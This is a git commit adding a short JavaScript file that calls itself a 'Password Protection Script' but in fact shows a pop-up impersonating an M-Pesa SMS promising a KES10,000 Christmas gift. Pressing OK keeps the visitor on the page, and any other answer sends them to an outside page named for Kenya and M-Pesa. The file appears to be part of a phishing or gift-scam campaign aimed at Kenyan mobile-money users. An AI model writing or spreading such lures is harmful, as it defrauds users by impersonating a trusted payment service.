a9ac288f41b02d7d6cdb1fd60e5b51bfb8cae717
itidnewblog1 <newblog1itid@gmail.com>
2025-12-07 06:39:23 +0100

    Create kenya-active.js

---
+++ kenya-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'GET KES10,000 GIFT'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive the KES10,000 Christmas Gift from M-Pesa. Please press OK to get Gift now.',
+  'GET KES10,000 GIFT'
+);
+if (password != 'GET KES10,000 GIFT') {
+  location.href = 'https://rhward.org/kenya-mpesa.html';
+}
